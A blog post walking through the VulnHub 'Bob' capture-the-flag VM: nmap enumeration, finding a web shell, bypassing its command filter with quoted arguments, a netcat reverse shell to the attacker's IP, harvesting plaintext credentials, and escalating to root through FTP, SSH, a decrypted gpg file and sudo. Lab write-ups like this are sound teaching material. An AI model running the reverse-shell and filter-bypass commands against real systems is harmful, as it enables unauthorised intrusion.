---
layout: post
title:  "Bob: v1.0.1 created by c0rruptedb1t"
date:   2018-04-06 17:30:00 +0700
categories: [ctf]
---
This VM can be downloaded at [VulnHub] and at [c0rruptedb1t].\\
Go check them out - they are awesome!

# Enumeration
As we boot the VM in `bridged mode` and there is no output on the console which shows us the IP address of the VM we scan the address space of our router which ip is `192.168.0.1`.

`nmap 192.168.0.1/24` -> `192.168.0.12`.

First, we start with our basic `nmap` scan to check for any open ports.

- `-sC: equivalent to --script=default`
- `-sV: Probe open ports to determine service/version info`
- `-O: Enable OS detection`

``` text
nmap -sCV -O 192.168.0.12

Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-07 12:25 CEST
Nmap scan report for 192.168.0.12
Host is up (0.0073s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 4 disallowed entries
| /login.php /dev_shell.php /lat_memo.html
|_/passwords.html
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Unix
```

There are two open ports: `21/ftp` and `80/http` and several subdirectories/files which we can check out via the browser.

`view-source:http://192.168.0.12/passwords.html`

``` html
<html>
<body>
  Really who made this file at least get a hash of your password to display,
  hackers can't do anything with a hash, this is probably why we had a security
  breach in the first place. Comeon
  people this is basic 101 security! I have moved the file off the server. Don't make me have to clean up the mess everytime
  someone does something as stupid as this. We will have a meeting about this and other
  stuff I found on the server. >:(
<br>
  -Bob
  </fieldset>
</body>
</html>
```
Inspecting the source code of the most promising page `passwords.html` we find out that there is obviously a file on the filesystem that contains passwords for some users. But there is no hint where. I am guessing: in the directory of the user `Bob` because he wrote this.
Lets check if we can find other directories/files with dirbuster.

`dirb http://192.168.0.12/ /usr/share/wordlists/big.txt`

``` text
---- Scanning URL: http://192.168.0.12/ ----
+ http://192.168.0.12/robots.txt (CODE:200|SIZE:111)
```
There is of course a file `robots.txt` we didn't thought about yet - lets check it out in browser.

``` text
User-agent: *
Disallow: /login.php
Disallow: /dev_shell.php
Disallow: /lat_memo.html
Disallow: /passwords.html
```

We found a _hidden_ `/dev_shell.php`.

![image-title-here](/static/img/devshellbob.JPG){:class="img-responsive"}

We have some kind of shell right now but some commands are disabled. We can cheat on this by putting quotes around our commands like:

![image-title-here](/static/img/devshellbob2.JPG){:class="img-responsive"}


There is a `.hint` file wich can be visited also in browser(because its the same directory) which contains a real hint.


`http://192.168.0.12/.hint`

``` text
Have you tried spawning a tty shell?
Also don't forget to check for hidden files ;)
```

Lets put a reverse shell in there and see what happens.

`"nc" "-e" "/bin/sh" "192.168.0.9" "1234"`

And listening for the incoming shell with:

- `-n, --dont-resolve  numeric-only IP addresses, no DNS`
- `-l, --listen  listen mode, for inbound connects`
- `-v, --verbose  verbose (use twice to be more verbose)`
- `-p, --local-port=NUM  local port number`

``` text
$ nc -nlvp 1234

Connection from 192.168.0.12:50050
whoami
www-data
```

Now we can upgrade the shell with

`python -c 'import pty;pty.spawn("/bin/bash");'`

``` text
www-data@Milburg-High:/var/www/html$
```

Now we have a working shell!
Next step is to check for a passwordfile in the directory of the user bob.

`ls -al /home/bob`

``` text
[...]
-rw-r--r--  1 bob  bob     72 Mar  5 04:12 .old_passwordfile.html
[...]
```

Guessing was right.

``` text
www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html
cat .old_passwordfile.html
<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>

```

Now we have the `username` and `password` of two users! but there is no `ssh` port we know. Maybe for FTP?
Lets check other user directories first.


``` text
www-data@Milburg-High:/home/elliot$ cat theadminisdumb.txt
cat theadminisdumb.txt
The admin is dumb,
In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same for his friend James who doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of time before it’s broken into so because of this I have changed my password to

theadminisdumb

I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.
```

There is another `username` and `password` combination in the `home` directory of the user `elliot`.

`elliot:theadminisdumb`

# Privilege escalation

Lets test out if we have access to the `FTP` service.
From the attacker machine we are connecting with:

``` text
$ ftp 192.168.0.12

220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.0.12]
Name (192.168.0.12:nullorzero):"elliot"
331 Password required for elliot
Password:"theadminisdumb"
---> PASS XXXX
230 User elliot logged in
---> SYST
215 UNIX Type: L8
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

We are in. Lets see if there is some `ssh` service running. We are downloading the `sshd_config`.

`ftp> get sshd_config`

``` text
[...]
Port 25468
[...]
```

There is a `ssh` service running on Port `25468`!
Lets test if we can reuse these `passwords`.

``` text
$ ssh elliot@192.168.0.12 -p 25468
  __  __ _ _ _                        _____
 |  \/  (_) | |                      / ____|
 | \  / |_| | |__  _   _ _ __ __ _  | (___   ___ _ ____   _____ _ __
 | |\/| | | | '_ \| | | | '__/ _` |  \___ \ / _ \ '__\ \ / / _ \ '__|
 | |  | | | | |_) | |_| | | | (_| |  ____) |  __/ |   \ V /  __/ |
 |_|  |_|_|_|_.__/ \__,_|_|  \__, | |_____/ \___|_|    \_/ \___|_|
                              __/ |
                             |___/


elliot@192.168.0.12's password:
Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

elliot@Milburg-High:~$
```

Since `Bob` is the `admin` of this server we need his credentials to get root.
In the directory of `Bob` is a `login.txt.gpg` which is an encrypted file that can be decrypted if we enter his passphrase.
There is most certainly a hint somewhere: In this `Not_Porn` folder we find some related notes.

``` text
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my favorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
```

I tested some variants of the contained strings and eventually tested.
`HARPOCRATES`
Lets decrypt!

- `-d, --decrypt  decrypt data (default)`

``` text
seb@Milburg-High:/home/bob/Documents$ gpg -d login.txt.gpg
gpg: AES encrypted data
gpg: encrypted with 1 passphrase

bob:b0bcat_
```

Found the credentials!

``` text
bob@Milburg-High:/$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)
```

``` text
bob@Milburg-High:/$ sudo su
root@Milburg-High:/# whoami

root

```

``` text
$ sudo nano flag.txt

CONGRATS ON GAINING ROOT

        .-.
       (   )
        |~|       _.--._
        |~|~:'--~'      |
        | | :   #root   |
        | | :     _.--._|
        |~|~`'--~'
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
   _____|_|_________ Thanks for playing ~c0rruptedb1t

```
We got root!

[VulnHub]: https://www.vulnhub.com/
[c0rruptedb1t]: http://c0rruptedb1t.ddns.net/vms/Bob.ova
